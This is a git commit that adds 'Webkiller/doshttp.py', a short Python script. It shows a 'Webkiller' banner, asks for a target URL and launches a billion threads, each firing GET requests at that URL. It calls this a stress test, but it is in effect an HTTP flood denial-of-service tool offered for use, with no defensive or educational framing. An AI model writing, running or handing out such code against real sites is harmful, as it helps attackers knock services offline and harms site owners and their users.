d057bf01729c41bd72ce42704172a2fc9539b3f8
Muhammed Tarik Inci <zheldy57@gmail.com>
2025-01-29 13:04:01 +0300

    Add files via upload

---
+++ Webkiller/doshttp.py
@@ -0,0 +1,59 @@
+# Github --> MuhammedTarikInci
+
+import requests
+import threading
+
+def print_ascii_header():
+    ascii_art = """
+     █     █░▓█████  ▄▄▄▄       ██ ▄█▀ ██▓ ██▓     ██▓    ▓█████  ██▀███  
+▓█░ █ ░█░▓█   ▀ ▓█████▄     ██▄█▒ ▓██▒▓██▒    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒
+▒█░ █ ░█ ▒███   ▒██▒ ▄██   ▓███▄░ ▒██▒▒██░    ▒██░    ▒███   ▓██ ░▄█ ▒
+░█░ █ ░█ ▒▓█  ▄ ▒██░█▀     ▓██ █▄ ░██░▒██░    ▒██░    ▒▓█  ▄ ▒██▀▀█▄  
+░░██▒██▓ ░▒████▒░▓█  ▀█▓   ▒██▒ █▄░██░░██████▒░██████▒░▒████▒░██▓ ▒██▒
+░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒   ▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░
+  ▒ ░ ░   ░ ░  ░▒░▒   ░    ░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░
+  ░   ░     ░    ░    ░    ░ ░░ ░  ▒ ░  ░ ░     ░ ░      ░     ░░   ░ 
+    ░       ░  ░ ░         ░  ░    ░      ░  ░    ░  ░   ░  ░   ░     
+                      ░                                               
+
+----------------------------------------------------------------------
+                    Made by Tarik | Vrsion > 0.1
+    """
+    print(ascii_art)
+
+
+def send_request(url):
+    try:
+        response = requests.get(url)
+        if response.status_code == 200:
+            print("[+] Successful! - Package sent")  
+        else:
+            print(f"[-] Error: Received unexpected status code {response.status_code}")
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Error: {e}")
+
+
+def stress_test(url, thread_count):
+    threads = []
+    for _ in range(thread_count):
+        thread = threading.Thread(target=send_request, args=(url,))
+        threads.append(thread)
+        thread.start()
+
+
+    for thread in threads:
+        thread.join()
+
+
+if __name__ == "__main__":
+    print_ascii_header()  
+    target_url = input("Target URL: ")
+    try:
+        # URL'yi doğrulama
+        if not target_url.startswith("http://") and not target_url.startswith("https://"):
+            print("Try Again...")
+        else:
+            
+            stress_test(target_url, 1000000000)
+    except Exception as e:
+        print(f"Bir hata oluştu: {e}")
